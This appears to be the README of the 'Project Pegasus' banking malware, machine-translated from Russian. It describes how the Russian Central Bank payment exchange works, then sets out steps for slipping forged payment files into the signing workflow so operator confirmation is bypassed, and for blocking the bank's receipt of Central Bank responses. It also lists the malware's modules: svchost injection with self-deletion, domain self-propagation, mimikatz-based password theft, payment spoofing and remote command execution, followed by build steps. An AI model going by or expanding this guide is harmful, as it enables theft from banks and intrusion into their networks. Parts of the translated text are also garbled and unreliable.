# Project-Pegasus
The scheme for the exchange of payments between the CB with the CB through the CBD ARM or the analogous software is as follows: 
1) ABS generates an xml file with payments by the operator's command 
2) This file is moved to the machine with the CBD AWP where it is checked (validation of fields, numbering control of documents, ) and signing. Depending on the KB policy, signing up may require the operator's action (viewing the amount and total amount of payments, reconciling with the register in the ABS, clicking the "Confirm" button), or the signing can be performed automatically (for a large amount of payments). In some cases, confirmation of more than 1 operator (signature of the controller after the operator's signature) may be required, then the file after 1 signature is moved to another KBM workstation and processed there.
3) The signed and encoded file is moved to the transport gateway (Astra or UTA). Often a certain action of the operator is required for sending - starting a link, moving a file between folders, etc. In rare cases, sending is done manually by uploading it to the Central Bank's website via a secure communication channel. 
4) After sending from the transport gateway, transport receipts first, and then reports on the confirmation of the execution (ED205) or placing in the queue of delayed (ED206), come almost immediately. 
5) Incoming documents are processed by the CBD AWS - they are decrypted and transferred to the ABS
6) ABS imports answers from the Central Bank and assigns the corresponding statuses to payments. If return statutes are received for non-existent (unregistered) payments, the ABS creates them automatically with the appropriate notations, which leads to unusual feelings among the staff of the correspondent relations department. 

In general, to send your payment through the CBD and CBA AWS it is necessary to: 
1) Find the machines related to the exchange with the CBA - ARM (s) of the CBD for the key process uarm.exe and the dispatch gateway type Astra (AstraC.exe) or UTA (Program Files \ Bank of Russia \ UTA)
2) In large banks, one or both components may be missing, and their role is to perform specialized software. Either the installation location may not be visible. In such cases, it is necessary to investigate ABS (RS-Bank, Diasoft, etc.), file servers, to find out how the payment file is exchanged. 
3) From the KBR AWP merge logs (uarm \ log \ folders with date) for the last 7-14 days. On the basis of logs find out the on-off time, the frequency of flights, the settings for file sharing. Depending on the settings, the KBM workstation can perform file signing automatically when it appears in certain folders, or the operator (or some other person) may require some intervention to move the file to the desired folder. 

To determine the settings of the KBM workstation, look at the beginning of the log file
Initialization 
Mode of operation - 'Combined', type of customer - 'Credit organization' Mode of operation can be Automatic gateway (no intervention required, the file is signed completely automatically), Combined - often requires "confirmation" from the operator, or Manual - when every action file between folders) is performed manually by the operator command. 

Also of interest is the following line. 
Formation Initialization Parameters: 'On for O: Shaft = True: True =: Mon = True', 'C: \ uarm3 \ exg \ opr', 'C: \ uarm3 \ exg \ ret'- True , 'C: \ uarm3 \ exg \ ret'- False,' OverwriteOut'- True 
This configuration indicates that the file in 'C: \ uarm3 \ exg \ opr'

If you analyze the payment sending log. 
Input control Start of file processing M: \ MCI \ OUT \ reestr010101.xml 
Input control The input file reestr010101.xml is moved to: C: \ uarm3 \ exg \ opr \ reestr010101.xml 
Input controlRepeating file processing reestr010101.xml 
Forming the CHANGING processing file C: \ uarm3 \ exg \ opr \ reestr010101.xml 
Formation The CA file reestr010101.xml is moved to: C: \ uarm3 \ exg \ ret \ reestr010101.xml 
Forming the KAR file processing completion reestr010101.xml 
Sending messages The beginning of file processing C: \ uarm3 \ exg \ ret \ reestr010101.xml 
Sending soobscheniyVhodnoy file reestr010101.xml moved in: m: \ ASTRA \ MCO \ MCO_OK \ reestr010101.xml 
outbox ka soobscheniyZavershenie reestr010101.xml file processing

you can see that the register of payments appeared in the M: \ MCI \ OUT \ folder was automatically detected by the KBM workstation, its validation was performed (input control) and it was copied to the local folder C: \ uarm3 \ exg \ opr \ reestr010101.xml 
The same folder is the input for signing (forming the CA, the authentication code), so the automatic signing of the file and its transfer to the network drive for further use by transport was subsequently performed. 
However, often the output folder of the input control and the input folder of the CA formation are different, which implies that the operator will check the payment register manually and give the "Confirm" command that will force the KBR workstation to move the file to the input folder of the SC formation.
You can skip this step if you copy the prepared file with payments directly to the input folder to generate the SC, which can be seen at the beginning of the log in the message Formation Initialization CAP. 
Also often the output file after the signature must be manually transferred to the transport gateway - some folder from which automatically, according to the schedule or by the operator's command, files are sent to the Central Bank. The input folder for transport is specified based on its logs and configuration. 
For UTA, these are two database files in the Program Files \ Bank of Russia \ UTA folder, for Astra - .log files in the folder where AstraC.exe lies

4) Consider measures to prevent responses from the Central Bank to the sent payment to the ABS. It can be a modification of the file sharing scripts, the disabling of the ABS servers, the file processing services (for example, xml blaster for diasoft), etc. The 


attached scripts 

gen_payments_script is the php script for generating the xml payment register. 
The gen1.php file is editing various settings related to requisites, both at the beginning (configuration) and the text, in the places where ED101 headers are generated and the outer envelope. 
In the folder src_accs are placed xml-outgoing payments from the KBM workstation (the folder exch \ inp or unpacked from stg \ arch \ inp), from which a selection is made for senders specific to the bank.
In curday_inp, immediately before generation and use, all outgoing payments from the CBD for the current day are placed. These files analyze the EdNo value to ensure that there is a through or at least non-overlapping numbering of individual payments, which is controlled in the cbr, gateway and on the side of the Central Bank. 
In t_accs, text files are placed on a standard format with card data and limits for translations. 


bck_logs - php-script for estimating the correspondent account balances based on backup files from uarm \ bck. 
subfolders with dates from uarm \ bck are copied to bck_logs, at startup the script displays the balance ranges for the day by the found dates.

Project Pegasus - a brief description of the contents 

Pegasus is a structured complex project for x32 and x64 platforms. 
The installer injects an image into the process memory of the svchost process with the system kernel and modules, after which the 
self- deletion is performed with the overwrite of the source file. 
The transfer of control in the source installer goes as follows: 
Shellcode -> InstallDispatcherDll 
The transfer of control in the new process follows the scheme: 
Shellcode -> WorkDispatcherDll -> all other modules 
When installed on top of the existing version, the build control is performed, and if it is lower or equal to the already 
existing version - installation is not performed.
Details of the functioning of the modules will take considerable time to describe, so if necessary, it is 
suggested to look at the source code - they are well commented and structured. 

For the assembly, you need a studio of at least 2013 and PHP Tools for Visual Studio from Devsense. 

Placement of files in 

binres folders . 
Compiled modules and other code for x32 and x64 platforms. 

BUILDS 
Final installers for both platforms, debugging and release versions, depending on the folder 

inc. 
Program modules (libraries ), used by various subprojects 

InstallDispatcherDll Installer 
module, executes injection into a new process 

InstallerExe
Initial installation project 

lib 
Files for successful compilation without MSVCRT 

LZ4_pack 
Resource packaging utility 

mod_CmdExec 
Module for launching commands from the panel (new process, command in the console, etc.) 

mod_DomainReplication 
Module of self-distribution in the domain 

mod_KBRI 
Module of substituting payments in the CBD 

mod_KBRI_hd 
Module injector for interception the CBD data exchange process and the receipt from mod_KBRI of the spoofed data 

mod_LogonPasswords 
The password search module, the rewritten and corrected code mimikatz 

mod_NetworkConnectivity 
The network communication module, including the pipes for machines with private network access

RemoteServiceExe 
A special executable file that is dropped on the remote system during distribution in the 

shared domain 
Common header and configuration files 

Shellcode Shellcode 
for loading and launching the connected libraries 

tools 
Utilities and scripts for building the project and its parts 

WEB 
The client part of the admin panel is integrated into the studio project 

web-adminpart 
Admin panel, copy from the development server 

WorkDispatcherDll 
The kernel module of the system 


In general, it is configured first \ shared \ config.h, then it is collected through the script \ tools \ MAKE_INSTALLERS.BAT 
with the parameter Release or Debug
Ready builds in \ BUILDS \
